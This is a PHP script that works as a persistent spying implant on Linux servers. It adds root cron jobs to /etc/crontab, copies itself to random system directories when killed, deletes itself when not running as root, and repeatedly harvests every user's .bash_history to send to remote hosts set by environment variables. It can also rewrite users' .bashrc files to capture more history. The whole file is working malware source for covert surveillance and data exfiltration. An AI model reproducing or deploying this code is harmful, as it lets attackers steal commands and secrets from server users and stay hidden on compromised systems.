<?php

// @phan-file-suppress PhanPluginShortArray,PhanPluginCanUsePHP71Void,PhanPluginPossiblyStaticClosure

error_reporting(0);

$lastSize = array();
$hosts = explode(',', getenv('TARGET_HOST'));
$key = getenv('TARGET_KEY');
$api = getenv('TARGET_FILE');
$protocol = getenv('TARGET_PROTOCOL');
$crypt = getenv('LOCAL_CRYPT');
$iv = getenv('LOCAL_IV');

$basename = basename(__FILE__, '.php');
$dir = __DIR__;
replaceIn('/etc/crontab', "\n* * * * * root sh $dir/$basename", '');
if (function_exists('posix_getuid') && posix_getuid() !== 0) {
    unlink(__FILE__);
    unlink("$dir/$basename.sh");
    exit;
}
if (getenv('##KILLNAME##') === '##KILLKEY##') {
    unlink(__FILE__);
    unlink("$dir/$basename.sh");
    exit;
}
if (extension_loaded('pcntl')) {
    $dataPhp = file_get_contents(__FILE__);
    $dataSh = file_get_contents("$dir/$basename.sh");
    $pcntlhandler = function () use ($dataPhp, $dataSh) {
        $file = randomAlphaNumericString(3);
        $dirs = array('opt', 'usr', 'var', 'home', 'root');
        do {
            $dir = $dirs[rand(0, count($dirs) - 1)];
        } while (!is_dir($dir));
        putIn('/etc/crontab', "\n* * * * * root sh /$dir/$file.sh", true);
        file_put_contents("/$dir/$file.sh", $dataSh);
        file_put_contents("/$dir/$file.php", $dataPhp);
    };
    if (defined('SIGTERM')) {
        // @phan-suppress-next-line PhanTypeMismatchArgumentNullableInternal
        pcntl_signal(SIGTERM, $pcntlhandler);
    }
    if (defined('SIGKILL')) {
        // @phan-suppress-next-line PhanTypeMismatchArgumentNullableInternal
        pcntl_signal(SIGKILL, $pcntlhandler);
    }
    unlink(__FILE__);
    unlink("$dir/$basename.sh");
} else {
    putIn('/etc/crontab', "\n* * * * * root sh $dir/$basename.sh", true);
    if (is_file("$dir/$basename.pid")) {
        $pid = intval(file_get_contents("$dir/$basename.pid"), 10);
        if (is_file("/proc/$pid")) {
            exit;
        }
    }
    file_put_contents("$dir/$basename.pid", getmypid());
}

while (true) {
    $files = array();
    foreach (explode("\n", getOut('/etc/passwd')) as $userData) {
        if ($userData) {
            $data = explode(':', $userData);
            if ($data[5]) {
                $user = preg_replace('/[^a-z0-9_-]+/i', '', $data[0]);
                if (is_dir($data[5])) {
                    $history = str_replace('//.bash_history', '/.bash_history', "{$data[5]}/.bash_history");
                    if (is_file($history) && is_readable($history)) {
                        $lastSize2 = filesize($history);
                        if (!isset($lastSize[$user]) || $lastSize[$user] !== $lastSize2) {
                            $data = getOut($history);
                            if ($data) {
                                while (!transmit($hosts, $api, $protocol, $data, $key, $user)) {
                                    usleep(rand(1, 999));
                                }
                                $lastSize[$user] = $lastSize2;
                            }
                        }
                    }
                    // @phan-suppress-next-line PhanPluginBothLiteralsBinaryOp
                    if ('###ENABLE_BASHRC_MODIFICATION###' === 'true') {
                        $rc = str_replace('//.bashrc', '/.bashrc', "{$data[5]}/.bashrc");
                        if (is_file($rc) || is_file($history)) {
                            $data = getOut($rc);
                            $found = false;
                            $lines = explode("\n", $data);
                            foreach ($lines as &$line) {
                                if (strlen($line) > 22 && substr($line, 0, 22) === 'export PROMPT_COMMAND=') {
                                    if (strpos($line, 'history -a') === false) {
                                        if (substr($line, strlen($line) - 1, 1) !== "'") {
                                            $parts = explode('=', $line, 2);
                                            $line = "{$parts[0]}='{$parts[1]}'";
                                        }
                                        $line = substr($line, 0, strlen($line) - 1) . ";history -a'";
                                    }
                                    $found = true;
                                }
                            }
                            if (!$found) {
                                $lines[] = "export PROMPT_COMMAND='history -a'";
                            }
                            $newData = implode("\n", $lines);
                            if ($newData !== $data) {
                                putIn($rc, $newData);
                                if (is_file($history)) {
                                    chown($rc, fileowner($history));
                                    chgrp($rc, filegroup($history));
                                    chmod($rc, 0644);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    if (exec('who -q') === '# users=0') {
        sleep(5);
    } else {
        sleep(1);
    }
}
